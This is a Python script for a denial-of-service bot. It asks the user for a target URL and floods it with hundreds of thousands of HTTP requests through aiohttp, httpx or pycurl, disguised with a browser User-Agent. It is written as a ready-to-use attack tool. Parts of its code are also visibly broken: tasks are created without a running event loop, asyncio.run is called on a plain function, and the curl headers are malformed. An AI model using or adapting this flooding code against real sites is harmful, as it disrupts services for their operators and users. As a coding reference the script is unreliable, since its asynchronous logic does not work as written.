import aiohttp
import httpx
import pycurl
import threading
import asyncio

class DDoSBot:
    def __init__(self, url, method='aiohttp'):
        self.url = url
        self.is_active = True
        self.method = method

    async def aiohttp_attack(self):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(500000):
                tasks.append(asyncio.create_task(session.get(self.url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                })))
            await asyncio.gather(*tasks)

    async def httpx_attack(self):
        async with httpx.AsyncClient() as client:
            tasks = []
            for _ in range(500000):
                tasks.append(client.get(self.url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }))
            await asyncio.gather(*tasks)

    def pycurl_attack(self):
        for _ in range(500000):
            c = pycurl.Curl()
            c.setopt(c.URL, self.url)
            c.setopt(c.HTTPHEADER, [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')])
            c.perform()
            c.close()

    def start_attack(self):
        if self.method == 'aiohttp':
            tasks = [asyncio.create_task(self.aiohttp_attack())]
        elif self.method == 'httpx':
            tasks = [asyncio.create_task(self.httpx_attack())]
        else:
            tasks = [asyncio.run(self.pycurl_attack())]
        asyncio.gather(*tasks)

def main():
    url = input("Enter the target URL: ")
    method = input("Enter the method (aiohttp, httpx, pycurl): ")
    bot = DDoSBot(url, method)
    bot.start_attack()

if __name__ == "__main__":
    main()
